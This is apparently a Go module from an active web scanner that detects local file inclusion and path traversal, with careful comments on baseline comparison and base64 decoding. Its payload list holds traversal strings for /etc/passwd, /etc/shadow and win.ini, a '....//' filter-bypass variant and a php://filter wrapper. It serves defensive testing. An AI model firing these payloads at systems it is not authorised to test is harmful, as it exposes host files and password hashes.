// Local file inclusion and path traversal.
//
// # The defect this detector exists to correct
//
// The upstream implementation of this module is the only one in the family
// that does not compare against a baseline. It fires a traversal payload and
// looks for `root:x:0:0:` in the response; if the string is there, it reports
// arbitrary file read. Every sibling module in the same file checks whether the
// fingerprint was already present, which is what makes a fingerprint mean "the
// injection caused this".
//
// For `/etc/passwd` that omission is not academic. The string `root:x:0:0:` is
// one of the most widely reproduced strings in computing: it appears in
// documentation, in tutorials, in error pages, in this project's own test
// fixtures, and in any application that helpfully displays a file listing. A
// baseline-free check reports arbitrary file read on every parameter of every
// page that happens to mention it, and the first operator who sees that stops
// reading the scanner's output at all.
//
// The check here is therefore not optional and not per-technique: the module
// takes the baseline and every technique in it routes through `Fresh`.
//
// # Why the absolute path is tried first
//
// A parameter that accepts a path verbatim usually accepts an absolute one, and
// the application needs no traversal decoding to serve it. It is the cheapest
// request in the list and the least ambiguous: a file served because it was
// named outright is a more certain finding than one served through a chain of
// encodings, and it removes any question about whether the traversal strings were
// decoded at all.
package active

import (
	"context"
	"encoding/base64"
	"regexp"
	"strings"
)

// passwdFingerprint is the first line of a real /etc/passwd, which is what
// distinguishes a file that was served from a page that merely talks about one.
const passwdFingerprint = "root:x:0:0:"

// shadowFingerprint marks a read of /etc/shadow, which is a materially different
// severity: the shadow file holds password hashes and is not world-readable on
// any sane system, so serving it means the traversal escaped both the web root
// and the permission model.
const shadowFingerprint = "root:$"

// lfiTechnique is one way of asking for a file.
type lfiTechnique struct {
	// name identifies the technique in the report.
	name string
	// payload is the value sent through the parameter.
	payload string
	// fingerprints are the strings that can only appear if the file was served.
	// They are matched against the *decoded* body: see encoded.
	fingerprints []string
	// encoded marks a technique whose response carries the file base64-encoded.
	//
	// Matching an encoded substring instead would be a guess about alignment.
	// base64 groups three bytes into four characters, so a prefix of the file
	// only appears verbatim in the encoded output when its length is a multiple
	// of three, and only when the padding lines up as well — a fingerprint
	// chosen by encoding a ten-byte prefix of a file whose encoding starts at a
	// different offset never matches anything, and the technique silently
	// reports nothing forever. Decoding the response and searching the decoded
	// text has no alignment to get wrong.
	encoded bool
	// claimed is the severity the evidence would support if it were proven.
	claimed Severity
	// description says what the technique demonstrates.
	description string
}

// lfiTechniques are tried in order. The order is cost: the absolute path first,
// because it needs no decoding to work; the encodings after, because a filter
// that blocks `../` is the reason they exist.
var lfiTechniques = []lfiTechnique{
	{
		name:         "absolute path",
		payload:      "/etc/passwd",
		fingerprints: []string{passwdFingerprint},
		claimed:      SeverityHigh,
		description: "The parameter accepts a filesystem path and the server returned the contents of " +
			"/etc/passwd without any traversal, so the parameter is a direct file read.",
	},
	{
		name:         "path traversal",
		payload:      "../../../../../../etc/passwd",
		fingerprints: []string{passwdFingerprint},
		claimed:      SeverityHigh,
		description: "Traversal sequences in the parameter escape the web root and the server returns the " +
			"contents of a host file, proving arbitrary local file read.",
	},
	{
		name:         "traversal with mixed encoding",
		payload:      "....//....//....//....//....//etc/passwd",
		fingerprints: []string{passwdFingerprint},
		claimed:      SeverityHigh,
		description: "The traversal survives a filter that strips the literal \"../\" sequence, so the " +
			"filter is bypassable and the parameter remains a file read.",
	},
	{
		name:         "shadow file read",
		payload:      "../../../../../../etc/shadow",
		fingerprints: []string{shadowFingerprint},
		claimed:      SeverityCritical,
		description: "The traversal reached /etc/shadow, which is not world-readable on a correctly " +
			"configured system. The read escaped both the web root and the file permission model.",
	},
	{
		name:         "windows target",
		payload:      "../../../../../../windows/win.ini",
		fingerprints: []string{"[fonts]", "[extensions]"},
		claimed:      SeverityHigh,
		description: "The traversal reached a Windows configuration file, so the target is a Windows " +
			"host and the read escaped the web root.",
	},
	{
		name:    "php filter wrapper",
		payload: "php://filter/convert.base64-encode/resource=/etc/passwd",
		// Matched against the decoded body, so the fingerprint is the file's
		// own first line rather than an encoding of a fragment of it.
		fingerprints: []string{passwdFingerprint},
		encoded:      true,
		claimed:      SeverityCritical,
		description: "A PHP stream wrapper was accepted and the server returned the file base64-encoded. " +
			"Source disclosure in one request, without any traversal at all.",
	},
}

// LFI is the local file inclusion detector.
type LFI struct{}

// Name implements Module.
func (LFI) Name() string { return "lfi" }

// Level implements Module.
func (LFI) Level() Level { return LevelParam }

// Scan probes one surface and stops at the first technique that answers.
//
// Stopping is not a shortcut. A parameter that returned /etc/passwd has
// demonstrated what the operator needs to know, and every further technique is
// another file read on a host that has already proven it will serve them.
func (m LFI) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	for _, technique := range lfiTechniques {
		if ctx.Err() != nil {
			return nil
		}
		resp, err := t.Fire(ctx, p, p.Param, technique.payload, false, nil)
		if err != nil {
			continue
		}
		// The surface the fingerprint is searched in. For a wrapper it is the
		// decoded response, and the baseline is decoded the same way so the
		// freshness check compares like with like.
		searched, searchedBaseline := resp, baseline
		if technique.encoded {
			searched = decodedCopy(resp)
			searchedBaseline = decodedCopy(baseline)
		}
		for _, fingerprint := range technique.fingerprints {
			// Fresh, never a bare Contains. This is the check the upstream
			// module omits, and omitting it is what turns a page that mentions
			// a passwd file into a high-severity finding.
			if !Fresh(searchedBaseline, searched, fingerprint) {
				continue
			}
			evidence := Snippet(searched.Body, fingerprint, 140)
			// A served file is proof, not a pattern: the content came back.
			finding, _ := NewFinding(Spec{
				Module:   "lfi",
				Title:    "Local File Inclusion (" + technique.name + ")",
				Claimed:  technique.claimed,
				Tier:     TierVerified,
				Point:    p,
				Payload:  technique.payload,
				Evidence: evidence,
				Description: technique.description + " The fingerprint was absent from the unmodified " +
					"response, so the file was served because of the injected path.",
				Remediation: "Allow-list file identifiers by name, never by path. Resolve and confine the " +
					"resolved path to a fixed root. Reject \"..\" segments before resolution rather than after.",
			})
			return []Finding{finding}
		}
	}
	return nil
}

// base64Run matches a base64-encoded stretch long enough to be a file rather
// than an identifier. Twenty characters is below the shortest interesting
// encoded line and above any hash, cookie or digest a page normally carries.
var base64Run = regexp.MustCompile(`[A-Za-z0-9+/]{20,}={0,2}`)

// decodedCopy returns a response whose body has been base64-decoded where a
// base64 run is present.
//
// A response that is not encoded comes back as an exact copy, so a caller can
// use this unconditionally and a technique that is not marked encoded behaves
// exactly as it would have without this function. A body with no decodable run
// is also returned unchanged — the fingerprint check then simply fails, which is
// the right outcome for a response that carries no file.
func decodedCopy(resp *Response) *Response {
	if resp == nil {
		return nil
	}
	run := base64Run.FindString(resp.Body)
	if run == "" {
		return resp
	}
	// Whitespace is stripped because a wrapper wraps its output, and a wrapped
	// line break inside a base64 run makes the decoder reject the whole thing.
	cleaned := strings.NewReplacer("\n", "", "\r", "", " ", "", "\t", "").Replace(run)
	decoded, err := base64.StdEncoding.DecodeString(cleaned)
	if err != nil {
		if trimmed, trimErr := base64.RawStdEncoding.DecodeString(cleaned); trimErr == nil {
			return &Response{StatusCode: resp.StatusCode, Header: resp.Header, Body: string(trimmed)}
		}
		return resp
	}
	return &Response{StatusCode: resp.StatusCode, Header: resp.Header, Body: string(decoded)}
}
